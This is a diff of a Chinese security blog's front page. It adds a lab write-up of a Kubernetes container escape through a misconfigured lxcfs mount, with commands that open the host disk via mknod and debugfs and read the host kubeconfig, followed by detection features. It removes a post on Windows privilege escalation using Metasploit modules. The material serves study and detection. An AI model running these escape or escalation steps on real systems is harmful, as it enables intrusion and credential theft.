@@ -1,4 +1,57 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Sally"><title>Sally's Blog</title><meta name="description" content="A simple and beautiful blog"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a class="current" href="/">主页</a></li><li> <a href="/archives">归档</a></li><li> <a href="/tags">标签</a></li><li> <a href="/about">关于</a></li><li> <a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/kabi.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/kabi.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">Sally's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/phoenixmerk"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="220" height="86" src="//music.163.com/outchain/player?type=2&amp;id=1293913379&amp;auto=1&amp;height=66&amp;&amp;loop=1"></iframe></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Sally</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/30/%E4%BB%8EEKS-CTF%E7%9C%8B%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">从EKS-CTF看云原生安全</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Sally"><title>Sally's Blog</title><meta name="description" content="A simple and beautiful blog"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a class="current" href="/">主页</a></li><li> <a href="/archives">归档</a></li><li> <a href="/tags">标签</a></li><li> <a href="/about">关于</a></li><li> <a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)" style="display:none;"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/kabi.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/kabi.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">Sally's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/phoenixmerk"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="220" height="86" src="//music.163.com/outchain/player?type=2&amp;id=1293913379&amp;auto=1&amp;height=66&amp;&amp;loop=1"></iframe></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Sally</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2024/01/16/lxcfs%20cgroup%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">lxcfs cgroup错误配置容器逃逸</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
+<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>Ubuntu 20.04</p>
+<p>docker 20.10.21</p>
+<p>kubernetes 1.22.7</p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="安装lxcfs"><a href="#安装lxcfs" class="headerlink" title="安装lxcfs"></a>安装lxcfs</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install lxcfs</span><br></pre></td></tr></table></figure>
+
+<p>验证安装</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116151755434.png" alt="image-20240116151755434"></p>
+<p>运行lxcfs</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl deamon-reload</span><br><span class="line">systemctl start lxcfs</span><br><span class="line">systemctl status lxcfs</span><br></pre></td></tr></table></figure>
+
+<p>或者手动运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxcfs /var/lib/lxcfs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116152153601.png" alt="image-20240116152153601"></p>
+<h3 id="部署带有漏洞的pod"><a href="#部署带有漏洞的pod" class="headerlink" title="部署带有漏洞的pod"></a>部署带有漏洞的pod</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl create ns cdk-test</span><br><span class="line">kubectl apply -f cdk-nginx.yaml</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cdk-nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">cdk-test</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cdk-nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lxcfs</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/tmp</span></span><br><span class="line">      <span class="attr">volumes:</span>                          <span class="comment"># 挂载lxcfs目录</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lxcfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/var/lib/lxcfs</span></span><br><span class="line">            <span class="attr">type:</span> <span class="string">Directory</span></span><br></pre></td></tr></table></figure>
+
+<p> 验证部署</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116153936192.png" alt="image-20240116153936192"></p>
+<h3 id="进入pod配置环境"><a href="#进入pod配置环境" class="headerlink" title="进入pod配置环境"></a>进入pod配置环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">exec</span> -it cdk-nginx-5d49fc6b5d-87z77 -n cdk-test /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116154108512.png" alt="image-20240116154108512"></p>
+<p>允许lxcfs查看所有设备，这个路径是在进入&#x2F;tmp&#x2F;cgroup&#x2F;devices&#x2F;kubepods.slice&#x2F;kubepods-besteffort.slice后一直深入后得到的，需要依照情况而定</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> a &gt; /tmp/cgroup/devices/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod4cde57c0_bb78_4ff5_8ce7_cc54c1521ee1.slice/docker-080ea39f7efecf95db7137341f951f30b9ef96aa54566841daa2a22649440bf9.scope/devices.allow</span><br></pre></td></tr></table></figure>
+
+<p>查看&#x2F;etc目录的node号和文件系统类型，确认node号为253:0 文件系统该类型为ext4</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/mountinfo |grep /etc</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116160522696.png" alt="image-20240116160522696"></p>
+<h3 id="创建设备进行逃逸"><a href="#创建设备进行逃逸" class="headerlink" title="创建设备进行逃逸"></a>创建设备进行逃逸</h3><p>设备文件名称<code>cdk-test</code>、文件类型<code>b</code>为块设备、主设备号<code>253</code>、次设备号<code>0</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mknod</span> cdk-test b 253 0</span><br></pre></td></tr></table></figure>
+
+<p>进行调试，通过ls命令和write命令即可读写文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debugfs -w cdk-test</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116161450819.png" alt="image-20240116161450819"></p>
+<h3 id="CDK方式"><a href="#CDK方式" class="headerlink" title="CDK方式"></a>CDK方式</h3><p>（这里换成了ubuntu镜像便于后续看进程细节）</p>
+<p>运行cdk逃逸脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run lxcfs-rw</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183339381.png" alt="image-20240116183339381"></p>
+<p>运行debugfs查看host_dev文件系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugfs -w host_dev</span><br><span class="line"><span class="built_in">cat</span> /root/.kube/config</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183421548.png" alt="image-20240116183421548"></p>
+<h2 id="特征提取"><a href="#特征提取" class="headerlink" title="特征提取"></a>特征提取</h2><h3 id="进程特征"><a href="#进程特征" class="headerlink" title="进程特征"></a>进程特征</h3><p>（这里换成了ubuntu镜像好查看进程细节）</p>
+<p>这个不是短进程，查看进程信息，&#x2F;bin&#x2F;bash为父进程，debugfs为子进程（参数为-w cdk-test，如果是使用cdk则参数固定为-w host_dev）</p>
+<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116175344403.png" alt="image-20240116175344403"></p>
+<h3 id="命令特征"><a href="#命令特征" class="headerlink" title="命令特征"></a>命令特征</h3><p>以下的命令都是固定的，也是由于CDK内置的原因</p>
+<p>.&#x2F;cdk run lxcfs-rw</p>
+<p> debugfs -w host_dev</p>
+</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-16</span><i class="fa fa-tag"></i><a class="tag" href="/tags/容器安全/" title="容器安全">容器安全 </a><span class="leancloud_visitors"></span><span>About499words, 1min39secread</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/30/%E4%BB%8EEKS-CTF%E7%9C%8B%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">从EKS-CTF看云原生安全</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
 <h1 id="Wiz-eksclustergames"><a href="#Wiz-eksclustergames" class="headerlink" title="Wiz-eksclustergames"></a>Wiz-eksclustergames</h1><p>国外云安全厂商Wiz举办了“EKS Cluster Games”——一项云安全夺旗 (CTF) 活动。该挑战由五种不同的场景组成，每种场景都侧重于可能的 Amazon EKS 问题。参与者将扮演攻击者，了解这些错误配置和安全问题，然后在受控环境中利用它们。 </p>
 <h2 id="1-第一部分"><a href="#1-第一部分" class="headerlink" title="1. 第一部分"></a>1. 第一部分</h2><h3 id="Secret-Seeker-寻找秘密"><a href="#Secret-Seeker-寻找秘密" class="headerlink" title="Secret Seeker 寻找秘密"></a>Secret Seeker 寻找秘密</h3><p>Jumpstart your quest by listing all the secrets in the cluster. Can you spot the flag among them?</p>
 <h4 id="1-1-使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）"><a href="#1-1-使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）" class="headerlink" title="1.1 使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）"></a>1.1 使用kubectl命令获取当前命名空间下的secret（由于我们只有这些权限）</h4><p>查看我们的权限</p>
@@ -874,89 +927,4 @@
 <p>查看vps的情况，发现反弹了shell</p>
 <p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230526153031190.png" alt="image-20230526153031190"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不管是shiro-550还是shiro-721，导致反序列化接口暴露的原因都是不安全的加密方式，一个是直接使用了硬编码模式，将默认密钥写入了源码中，一个能够根据工作模式和填充方式组合的缺陷绕过获取密钥直接暴力破解出明文。</p>
-</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-06-07</span><i class="fa fa-tag"></i><a class="tag" href="/tags/常见web漏洞/" title="常见web漏洞">常见web漏洞 </a><span class="leancloud_visitors"></span><span>About1968words, 6min33secread</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/06/06/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">权限提升</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg"></a></p>
-<h2 id="提权概述"><a href="#提权概述" class="headerlink" title="提权概述"></a>提权概述</h2><p>提权，网络术语，提高自己在服务器中的权限，主要针对网站入侵过程中，当入侵某一网站时，通过各种漏洞提升WEBSHELL权限以夺得该服务器权限。</p>
-<p>Windows：user –&gt; administrator</p>
-<p>Linux：user –&gt; root</p>
-<h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><ul>
-<li>拥有webshell、普通用户权限</li>
-<li>拥有某些软件的账号密码 </li>
-<li>本地或远程服务器上存在漏洞</li>
-<li>拥有漏洞利用工具代码</li>
-</ul>
-<h2 id="操作系统内核漏洞提权"><a href="#操作系统内核漏洞提权" class="headerlink" title="操作系统内核漏洞提权"></a>操作系统内核漏洞提权</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>利用window系统中没有打补丁的内核溢出漏洞进行攻击。</p>
-<p>1.查看当前用户权限</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> /groups</span><br></pre></td></tr></table></figure>
-
-<p>2.查看系统安全补丁</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">wmic qfe get Caption,Description,HotFixiD,InstalledOn</span><br></pre></td></tr></table></figure>
-
-<p>3.与可以进行提权的内核溢出漏洞exp进行对比</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
-<p>4.执行EXP</p>
-<h3 id="实战演练"><a href="#实战演练" class="headerlink" title="实战演练"></a>实战演练</h3><ol>
-<li>利用其它漏洞获取一个shell，查看权限为普通用户</li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230606000405740.png" alt="image-20230606000405740"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line"><span class="built_in">whoami</span>  /groups</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230606093932292.png" alt="image-20230606093932292"></p>
-<ol start="2">
-<li>使用post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester进行提权漏洞检测</li>
-</ol>
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230605212101590.png" alt="image-20230605212101590"></p>
-<ol start="3">
-<li>我们可以选择一个漏洞进行利用例如MS_2018_8120进行利用</li>
-</ol>
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230605235454327.png" alt="image-20230605235454327"></p>
-<ol start="4">
-<li>配置好参数后run，查看系统当前权限为SYSTEM权限</li>
-</ol>
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230606000113453.png" alt="image-20230606000113453"></p>
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230606100012402.png" alt="image-20230606100012402"></p>
-<h2 id="Windows操作系统配置错误提权"><a href="#Windows操作系统配置错误提权" class="headerlink" title="Windows操作系统配置错误提权"></a>Windows操作系统配置错误提权</h2><h3 id="系统服务配置错误提权"><a href="#系统服务配置错误提权" class="headerlink" title="系统服务配置错误提权"></a>系统服务配置错误提权</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>Windwos系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。如果一个低权限的用户对这类系统服务的可执行文件具有写权限，就可以将其替换成任意可执行文件，并随着系统服务的启动获得系统权限。</p>
-<p>系统服务权限配置错误有两种可能：</p>
-<ul>
-<li>服务未运行，攻击者会使用任意服务替换原来的服务，然后重启服务</li>
-<li>服务正在运行且无法终止，这种情况适用于绝大多数漏洞利用场景，攻击者通常会利用DLL劫持技术并尝试和重启服务来提权</li>
-</ul>
-<h4 id="实战演练-1"><a href="#实战演练-1" class="headerlink" title="实战演练"></a>实战演练</h4><ol>
-<li>首先获取了一个shell，具有普通用户权限</li>
-</ol>
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230606101907522.png" alt="image-20230606101907522"></p>
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230606101939033.png" alt="image-20230606101939033"></p>
-<ol start="2">
-<li>利用exploit&#x2F;windows&#x2F;local&#x2F;service_permissions模块进行检查，选择AGGRESSIVE选项，可以利用目标机器每一个有缺陷的服务。</li>
-</ol>
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230606103053027.png" alt="image-20230606103053027"></p>
-<h3 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>Windows服务通常是以System权限运行的，所以系统在解析服务所对应的文件路径中的空格会以系统权限运行。</p>
-<p>例如：有个文件路径”C:\Program Files\Some Folder\Service.exe”</p>
-<p>则对于每一个空格，<strong>Windows都会尝试寻找并执行与空格前面名字相匹配的程序，操作系统会对你路径中空格的所有可能情况进行尝试，直到一个能匹配的程序。</strong></p>
-<ul>
-<li>C:\Program.exe</li>
-<li>C:\Progarm Files\Some.exe</li>
-</ul>
-<p>如果一个按上述规则命名的可执行程序上传到受影响的目录中，那么服务一旦重启，则会以System权限运行。</p>
-<p>漏洞利用可能的情况：</p>
-<ul>
-<li>如果该路径与服务相关，就会任意创建一个服务或者Service模板</li>
-<li>如果路径与可执行文件有关，就任意创建一个可执行文件</li>
-</ul>
-<h3 id="注册表键AlwaysInstallElevated"><a href="#注册表键AlwaysInstallElevated" class="headerlink" title="注册表键AlwaysInstallElevated"></a>注册表键AlwaysInstallElevated</h3><h4 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h4><p>注册表键AlwaysInstallElevated是一个策略设置项，如果启用了，任何权限的用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI文件。</p>
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230606105441626.png" alt="image-20230606105441626"></p>
-<h2 id="组策略首选项提权"><a href="#组策略首选项提权" class="headerlink" title="组策略首选项提权"></a>组策略首选项提权</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>管理员在域中新建组策略后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件保存了该组策略更新后的密码，使用AES-256加密。但是微软在2012年公布了AES-256的私钥，导致保存在XML文件中的密码可以被解密。在SYSVOL中可以找到<strong>包含cpassword的XML文件</strong>。</p>
-<h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><h3 id="介绍-5"><a href="#介绍-5" class="headerlink" title="介绍"></a>介绍</h3><p>在权限不够的情况下，访问系统盘的根目录，Windows目录、Program Files目录，以及读写系统登录数据库等操作都要进行UAC的认证才能进行。</p>
-<h3 id="实战演练-2"><a href="#实战演练-2" class="headerlink" title="实战演练"></a>实战演练</h3><ol>
-<li>首先获取一个shell，权限是普通用户权限，但是该用户必须在管理员组中，并且设置UAC为仅在程序试图更改我的计算机时通知我。</li>
-</ol>
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230606112846262.png" alt="image-20230606112846262"></p>
-<ol start="2">
-<li>接着使用exploit&#x2F;windows&#x2F;local&#x2F;bypassuac模块，配置好选项后运行发现成功绕过，获取SYSTEM权限</li>
-</ol>
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230606113413798.png" alt="image-20230606113413798"></p>
-<p><img src="https://merk11-cnblog.oss-cn-beijing.aliyuncs.com/blogimg/image-20230606113254419.png" alt="image-20230606113254419"></p>
-<h2 id="令牌窃取提权"><a href="#令牌窃取提权" class="headerlink" title="令牌窃取提权"></a>令牌窃取提权</h2><h3 id="介绍-6"><a href="#介绍-6" class="headerlink" title="介绍"></a>介绍</h3><p>这个提权方式是针对Kerberos协议，通过入侵服务器，在客户端登录时窃取客户端的令牌，从而获取其权限。但前提是需要获取SYSTEM权限的令牌。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章总结了常见的Windows提权方式。</p>
-</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-06-06</span><i class="fa fa-tag"></i><a class="tag" href="/tags/内网渗透/" title="内网渗透">内网渗透 </a><span class="leancloud_visitors"></span><span>About1263words, 4min12secread</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/2/">Próximo</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><script src="/js/baidu-tongji.js"></script></body></html>
+</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-06-07</span><i class="fa fa-tag"></i><a class="tag" href="/tags/常见web漏洞/" title="常见web漏洞">常见web漏洞 </a><span class="leancloud_visitors"></span><span>About1968words, 6min33secread</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/2/">Próximo</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div><script src="/js/baidu-tongji.js"></script></body></html>
